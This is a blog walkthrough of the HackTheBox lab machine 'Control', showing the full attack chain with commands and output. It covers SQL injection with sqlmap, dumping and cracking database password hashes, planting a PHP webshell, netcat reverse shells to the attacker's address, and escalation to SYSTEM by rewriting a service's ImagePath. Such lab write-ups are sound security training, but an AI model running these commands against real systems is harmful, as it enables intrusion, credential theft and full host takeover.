---
layout: post
title: Hackthebox Control Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/control.png)

# Explanation
[Hackthebox](https://www.hackthebox.eu/) is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box `Control`.

# Solution
## 1. Initial Enumeration
#### TCP Port Scanning:
```shell
root@kali:~# nmap -p- 10.10.10.167 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-22 16:08 JST
Nmap scan report for 10.10.10.167
Host is up (0.23s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Fidelity
135/tcp   open  msrpc   Microsoft Windows RPC
3306/tcp  open  mysql?
| fingerprint-strings:
|   LDAPBindReq:
|_    Host '10.10.14.42' is not allowed to connect to this MariaDB server
49666/tcp open  msrpc   Microsoft Windows RPC
49667/tcp open  msrpc   Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80%I=7%D=8/22%Time=5F40C5AB%P=x86_64-pc-linux-gnu%r(LD
SF:APBindReq,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.42'\x20is\x20not\x
SF:20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 363.61 seconds
```

#### Gobuster HTTP:
```shell
root@kali:~# gobuster dir -u http://10.10.10.167 -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.167
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/22 16:40:35 Starting gobuster
===============================================================
/Images (Status: 301)
/admin.php (Status: 200)
/assets (Status: 301)
/images (Status: 301)
/index.php (Status: 200)
/uploads (Status: 301)
===============================================================
2020/08/22 16:42:24 Finished
===============================================================
```

## 2. Getting User

On the website at port 80, we have a company website.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-23-10-45-44.png)

In the body of the HTML code, we have some comments that indicates new payment system is under the development.
```shell
root@kali:~# curl -s http://10.10.10.167 | head -n 20
<!DOCTYPE html>
<html lang="en">

<head>
	<title>Fidelity</title>
	<meta charset="utf-8">
	<script type="text/javascript" src="assets/js/functions.js"></script>
	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
	<link rel="stylesheet" href="assets/css/main.css" />
	<noscript>
		<link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
</head>

<body class="is-preload landing">
	<div id="page-wrapper">
		<!-- To Do:
			- Import Products
			- Link to new payment system
			- Enable SSL (Certificates location \\192.168.4.28\myfiles)
		<!-- Header -->
```

Try to access `admin.php` we found during web enumeration.<br>
It looks that to access this page, we need...
1. A header
2. To go through a proxy
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-22-16-56-32.png)

Then, add an HTTP header `X-Forwarded-For` for all traffic.<br>
We can use Burp Suite for this purpose.<br>
The IP address is the one from the HTML comments.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-23-11-01-55.png)

Now we can access the admin console.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-22-16-57-36.png)

Then, try to check if there is any SQL injection.<br>
By posting a single quote, we can find that this search form is suffering SQLi.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-22-17-00-44.png)
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-22-17-01-47.png)

Getting additional information using `sqlmap`.<br>
First, create the following file from Burp Suite.
```shell
root@kali:~# cat request.txt 
POST /search_products.php HTTP/1.1
Host: 10.10.10.167
Content-Length: 23
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.10.167
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.10.167/admin.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
X-Forwarded-For: 192.168.4.28

productName=singlequote
```

Run the following command.<br>
We can confirm that this DBMS is MySQL and SQL injection here.
```shell
root@kali:~# sqlmap -r request.txt
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.7#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:47:44 /2020-08-22/

[18:47:44] [INFO] parsing HTTP request from 'request.txt'
[18:47:44] [INFO] resuming back-end DBMS 'mysql' 
[18:47:44] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: productName (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: productName=-4659' OR 1554=1554#

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: productName=singlequote' AND (SELECT 6059 FROM(SELECT COUNT(*),CONCAT(0x716a767071,(SELECT (ELT(6059=6059,1))),0x71627a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- AQqk

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: productName=singlequote';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: productName=singlequote' AND (SELECT 9910 FROM (SELECT(SLEEP(5)))MSMm)-- ZxSn

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: productName=singlequote' UNION ALL SELECT NULL,NULL,CONCAT(0x716a767071,0x514e62776f6a7857665279767352596548547264775877554474616670484969466b4f724f575572,0x71627a6a71),NULL,NULL,NULL#
---
[18:47:44] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[18:47:44] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.167'

[*] ending @ 18:47:44 /2020-08-22/
```

After that, run the following command to retrieve password hashes for MySQL.<br>
We can achieve 3 hashes for `hector`, `manager` and `root`.
```shell
root@kali:~# sqlmap -r request.txt --password

---

database management system users password hashes:
[*] hector [1]:
    password hash: *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D
[*] manager [1]:
    password hash: *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA
[*] root [1]:
    password hash: *0A4A5CAD344718DC418035A1F4D292BA603134D8

[18:50:54] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.167'

[*] ending @ 18:50:54 /2020-08-22/
```

Using John the Ripper, we can crack the password hash with `rockyou.txt`.
```shell
root@kali:~# cat hash.txt 
hector:*0E178792E8FC304A2E3133D535D38CAF1DA3CD9D
manager:*CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA
root:*0A4A5CAD344718DC418035A1F4D292BA603134D8
```
```shell
root@kali:~# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=mysql-sha1
Using default input encoding: UTF-8
Loaded 3 password hashes with no different salts (mysql-sha1, MySQL 4.1+ [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
l33th4x0rhector  (hector)
Warning: Only 2 candidates left, minimum 8 needed for performance.
1g 0:00:00:01 DONE (2020-08-22 18:57) 0.7299g/s 10468Kp/s 10468Kc/s 25610KC/sa6_123..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Now we got this credential.
```shell
hector:l33th4x0rhector
```

Next, to achieve a shell, upload a PHP webshell using the following command.<br>
We have `simple-backdoor.php` installed on Kali linux.
```shell
root@kali:~# sqlmap -r request.txt --file-write=/usr/share/webshells/php/simple-backdoor.php --file-dest=C:/inetpub/wwwroot/backdoor.php

---

[*] starting @ 19:05:43 /2020-08-22/

[19:05:43] [INFO] parsing HTTP request from 'request.txt'
[19:05:43] [INFO] resuming back-end DBMS 'mysql' 
[19:05:43] [INFO] testing connection to the target URL

---

[19:05:44] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[19:05:44] [INFO] fingerprinting the back-end DBMS operating system
[19:05:44] [INFO] the back-end DBMS operating system is Windows
[19:05:45] [WARNING] potential permission problems detected ('Access denied')
[19:05:46] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)          
do you want confirmation that the local file '/usr/share/webshells/php/simple-backdoor.php' has been successfully written on the back-end DBMS file system ('C:/inetpub/wwwroot/backdoor.php')? [Y/n] Y
[19:06:05] [INFO] the local file '/usr/share/webshells/php/simple-backdoor.php' and the remote file 'C:/inetpub/wwwroot/backdoor.php' have the same size (328 B)
[19:06:05] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.167'

[*] ending @ 19:06:05 /2020-08-22/
```

To confirm if we uploaded our webshell correctly, we use `curl` command.
```shell
root@kali:~# curl http://10.10.10.167/backdoor.php?cmd=whoami
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<pre>nt authority\iusr
</pre>
```

Next, upload `nc.exe` to get a reverse shell.
```shell
root@kali:~# sqlmap -r request.txt --file-write=/usr/share/windows-binaries/nc.exe --file-dest=C:/inetpub/wwwroot/nc.exe

---

do you want confirmation that the local file '/usr/share/windows-binaries/nc.exe' has been successfully written on the back-end DBMS file system ('C:/inetpub/wwwroot/nc.exe')? [Y/n] Y
[19:23:18] [INFO] the local file '/usr/share/windows-binaries/nc.exe' and the remote file 'C:/inetpub/wwwroot/nc.exe' have the same size (59392 B)
[19:23:18] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.167'

[*] ending @ 19:23:18 /2020-08-22/
```

Using the webshell we uploaded, we can execute `dir` command.<br>
The uploaded `nc.exe` is in the folder `C:\inetpub\wwwroot`.
```shell
root@kali:~# curl http://10.10.10.167/backdoor.php?cmd=dir+C:\\inetpub\\wwwroot
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<pre> Volume in drive C has no label.
 Volume Serial Number is C05D-877F

 Directory of C:\inetpub\wwwroot

08/22/2020  12:36 PM    <DIR>          .
08/22/2020  12:36 PM    <DIR>          ..
11/05/2019  03:42 PM             7,867 about.php
11/20/2019  02:16 AM             7,350 admin.php
10/23/2019  05:02 PM    <DIR>          assets
08/22/2020  12:19 PM               328 backdoor.php
11/05/2019  03:42 PM               479 create_category.php
11/05/2019  03:42 PM               585 create_product.php
11/05/2019  03:42 PM               904 database.php
11/05/2019  03:42 PM               423 delete_category.php
11/05/2019  03:42 PM               558 delete_product.php
11/05/2019  03:42 PM    <DIR>          images
11/19/2019  06:57 PM             3,145 index.php
11/05/2019  03:42 PM            17,128 LICENSE.txt
08/22/2020  12:36 PM            59,392 nc.exe
11/19/2019  07:07 PM             3,578 search_products.php
11/05/2019  03:42 PM               498 update_category.php
11/05/2019  03:42 PM             4,056 update_product.php
11/12/2019  12:49 PM    <DIR>          uploads
11/05/2019  03:42 PM             2,933 view_product.php
              15 File(s)        109,224 bytes
               5 Dir(s)  43,613,020,160 bytes free
</pre>
```

Now we finished preparation for getting a reverse shell.<br>
Launch a netcat listener and execute the following `curl` command.
```shell
root@kali:~# nc -nlvp 4443
listening on [any] 4443 ...

```
```shell
root@kali:~# curl http://10.10.10.167/backdoor.php?cmd=C:\\inetpub\\wwwroot\\nc.exe+-e+powershell.exe+10.10.14.42+4443
```

The target machine spawns a PowerShell session and send back to our localhost as `nt authority\iusr`.<br>
However, we still can't get `user.txt` and need a lateral movement.
```shell
root@kali:~# nc -nlvp 4443
listening on [any] 4443 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.10.167] 51393
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot> whoami
whoami
nt authority\iusr
```
```shell
PS C:\users\Hector> ls
ls
ls : Access to the path 'C:\users\Hector' is denied.
At line:1 char:1
+ ls
+ ~~
    + CategoryInfo          : PermissionDenied: (C:\users\Hector:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

We already have a password `l33th4x0rhector` for `Hector`.<br>
To achieve an user shell as `Hector`, we still need the hostname of this machine.
```shell
PS C:\users\Hector> hostname
hostname
Fidelity
```

To run a command as `hector`, we need to execute the following commands.<br>
Running `whoami` shows that the command is executed as `control\hector`.
```shell
PS C:\> $password = convertto-securestring -AsPlainText -Force -String "l33th4x0rhector"
$password = convertto-securestring -AsPlainText -Force -String "l33th4x0rhector"
PS C:\> $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Fidelity\hector",$password
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Fidelity\hector",$password
PS C:\> Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -Credential $credential
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -Credential $credential
control\hector
```

Then, achieve a reverse shell as `hector`.<br>
Launch a netcat listener and run the following PowerShell command on the target machine.
```shell
root@kali:~# nc -nlvp 4444
listening on [any] 4444 ...

```
```shell
PS C:\> Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\inetpub\wwwroot\nc.exe 10.10.14.42 4444 -e powershell.exe } -Credential $credential
```

Go back to the netcat listener window.<br>
We can see that we got a shell as `control\hector`.
```shell
root@kali:~# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.10.167] 51401
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Hector\Documents> whoami
whoami
control\hector
```

`user.txt` is in the folder `C:\Users\Hector\Desktop\`.
```shell
PS C:\Users\Hector\Documents> cat C:\users\hector\Desktop\user.txt
cat C:\users\hector\Desktop\user.txt
d8782dd01fb15b72c4b5ba77ef2d472b
```


## 3. Getting Root

Taking a look at the PowerShell command history.<br>
We can find only 2 commands.
```shell
PS C:\> gc (get-PSReadlineOption).HistorySavePath
gc (get-PSReadlineOption).HistorySavePath
get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
```

The first command shows the entries of `HKLM:\SYSTEM\CurrentControlset`.<br>
It contains the following 6 keys.
1. Control
2. Enum
3. Hardware profiles
4. Policies
5. Services
6. Software

```shell
PS C:\Users\Hector\Documents> get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
get-childitem HKLM:\SYSTEM\CurrentControlset | format-list


Property      : {BootDriverFlags, CurrentUser, EarlyStartServices, PreshutdownOrder...}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Control
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 121
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 11
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control

Property      : {NextParentID.daba3ff.2, NextParentID.61aaa01.3, NextParentID.1bd7f811.4, NextParentID.2032e665.5...}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Enum
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Enum
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 17
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 27
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Enum

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Hardware Profiles
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Hardware Profiles
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 3
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Hardware Profiles

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Policies
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Policies
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 0
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Policies

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Services
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 667
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Software
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Software
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 1
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Software
```

The second command is for trying to get the access the permission of this registry tree.<br>
We can find SDDL (Security Descriptor Definition Language) as well, but plain SDDL is not human readable.
```shel
PS C:\> get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
get-acl HKLM:\SYSTEM\CurrentControlSet | format-list


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : BUILTIN\Administrators Allow  FullControl
         NT AUTHORITY\Authenticated Users Allow  ReadKey
         NT AUTHORITY\Authenticated Users Allow  -2147483648
         S-1-5-32-549 Allow  ReadKey
         S-1-5-32-549 Allow  -2147483648
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -2147483648
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  
         ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  
         -2147483648
Audit  : 
Sddl   : O:BAG:SYD:AI(A;;KA;;;BA)(A;ID;KR;;;AU)(A;CIIOID;GR;;;AU)(A;ID;KR;;;SO)(A;CIIOID;GR;;;SO)(A;ID;KA;;;BA)(A;CIIOI
         D;GA;;;BA)(A;ID;KA;;;SY)(A;CIIOID;GA;;;SY)(A;CIIOID;GA;;;CO)(A;ID;KR;;;AC)(A;CIIOID;GR;;;AC)(A;ID;KR;;;S-1-15-
         3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)(A;CIIOID;GR;;;S
         -1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)
```

Using the following command, we can make the SDDL readable for humans.<br>
It shows that `Control\Hector` has `FullControl` permission and we can modify the value `ImagePath` for specifying executables.
```
PS C:\Users\Hector\Documents> $acl = get-acl HKLM:\System\CurrentControlSet\Services
$acl = get-acl HKLM:\System\CurrentControlSet\Services
PS C:\Users\Hector\Documents> ConvertFrom-SddlString -Sddl $acl.Sddl -type RegistryRights
ConvertFrom-SddlString -Sddl $acl.Sddl -type RegistryRights


Owner            : NT AUTHORITY\SYSTEM
Group            : NT AUTHORITY\SYSTEM
DiscretionaryAcl : {NT AUTHORITY\Authenticated Users: AccessAllowed (EnumerateSubKeys, ExecuteKey, Notify, 
                   QueryValues, ReadPermissions), NT AUTHORITY\SYSTEM: AccessAllowed (ChangePermissions, CreateLink, 
                   CreateSubKey, Delete, EnumerateSubKeys, ExecuteKey, FullControl, GenericExecute, GenericWrite, 
                   Notify, QueryValues, ReadPermissions, SetValue, TakeOwnership, WriteKey), BUILTIN\Administrators: 
                   AccessAllowed (ChangePermissions, CreateLink, CreateSubKey, Delete, EnumerateSubKeys, ExecuteKey, 
                   FullControl, GenericExecute, GenericWrite, Notify, QueryValues, ReadPermissions, SetValue, 
                   TakeOwnership, WriteKey), CONTROL\Hector: AccessAllowed (ChangePermissions, CreateLink, 
                   CreateSubKey, Delete, EnumerateSubKeys, ExecuteKey, FullControl, GenericExecute, GenericWrite, 
                   Notify, QueryValues, ReadPermissions, SetValue, TakeOwnership, WriteKey)...}
SystemAcl        : {}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
```

After that, try to find if really `Control\Hector` has permission for services.<br>
As the following result shows, we have over 3000 `FullControl` access for all entries (services).
```
PS C:\Users\Hector\Documents> get-acl HKLM:\System\CurrentControlSet\services\* | Format-List *| findstr /i "Hector Users Path Everyone"
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List *| findstr /i "Hector Users Path"
PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET
PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services
Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET
                          NT AUTHORITY\Authenticated Users Allow  ReadKey
                          CONTROL\Hector Allow  FullControl
PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET
PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services
Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET
                          NT AUTHORITY\Authenticated Users Allow  ReadKey
                          CONTROL\Hector Allow  FullControl
PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET
PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services
Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET
                          NT AUTHORITY\Authenticated Users Allow  ReadKey
                          CONTROL\Hector Allow  FullControl

---

```
```
PS C:\Users\Hector\Documents> get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "hector Users Path Everyone" | measure
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "hector Users Path Everyone" | measure


Count    : 3427
Average  : 
Sum      : 
Maximum  : 
Minimum  : 
Property : 
```

We can confirm that `Hector\Control` has permission for `wuau` (Windows update Automatic Update) as well.<br>
We can take advantage of this because...<br>
1. We can restart it manually.
2. It is already configured to run as LocalSystem.
```
PS C:\Users\Hector\Documents> get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "hector Users Path Everyone" | findstr /i "wuau"
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "hector Users Path Everyone" | findstr /i "wuau"
PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wuau
Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wuau
```

Plan to get a reverse shell as `NT AUTHORITY\SYSTEM`.<br>
First, launch a netcat listener on port 4445.
```shell
root@kali:~# nc -nlvp 4445
listening on [any] 4445 ...

```

Since we've uploaded `nc.exe` already, we can use the following command.<br>
Edit the `ImagePath` attribute of `HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wuau`.<br>
To start the service, we need to run `Start-Service wuauserv`.
```shell
PS C:\> reg add "HKLM\System\CurrentControlSet\services\wuauserv" /t REG_EXPAND_SZ /v ImagePath /d "C:\inetpub\wwwroot\nc.exe -e powershell 10.10.14.42 4445" /f
reg add "HKLM\System\CurrentControlSet\services\wuauserv" /t REG_EXPAND_SZ /v ImagePath /d "C:\inetpub\wwwroot\nc.exe -e powershell 10.10.14.42 4445" /f
The operation completed successfully.
PS C:\> Start-Service wuauserv
```

Now we got a reverse shell as `NT AUTHORITY\SYSTEM`.
```shell
root@kali:~# nc -nlvp 4445
listening on [any] 4445 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.10.167] 51404
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system
```

As always, `root.txt` is in the directory `C:\Users\Administrator\Desktop\`.
```shell
PS C:\Windows\system32> cat C:\users\administrator\desktop\root.txt
cat C:\users\administrator\desktop\root.txt
8f8613f5b4da391f36ef11def4cec1b1
```
